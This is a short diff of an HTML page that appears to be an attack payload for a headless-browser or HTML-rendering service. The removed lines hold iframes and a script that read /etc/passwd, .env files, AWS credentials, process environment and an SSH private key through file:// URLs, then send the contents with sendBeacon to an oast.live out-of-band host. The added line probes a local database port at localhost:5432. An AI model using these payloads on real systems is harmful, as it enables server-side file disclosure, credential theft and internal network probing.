@@ -3,27 +3,9 @@
  <body>
   <div id="result"></div>
   <div id="result1"></div>
-<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
-<iframe src="file:///app/.env" width="1000" height="1000"></iframe>
-<iframe src="file:///root/.aws/credentials" width="1000" height="1000"></iframe>
-<iframe src="file:///proc/self/environ" width="1000" height="1000"></iframe>
-   <!-- Browsers auto-generan listing para directorios -->
-<iframe src="file:///app/" width="1000" height="1000"></iframe>
-<iframe src="file:///root/" width="1000" height="1000"></iframe>
-
+<iframe src="http://localhost:5432">
 
   <script>
-async function leak() {
-  const files = ["/etc/passwd", "/app/.env", "/root/.ssh/id_rsa"];
-  const data = {};
-  for (const f of files) {
-    try {
-      data[f] = await fetch(`file://${f}`).then(r => r.text());
-    } catch (e) {}
-  }
-  navigator.sendBeacon("https://d9svklamruols3gjkiq03x9sijp3ahc44.oast.live/", JSON.stringify(data));
-}
-leak();
 
 
 
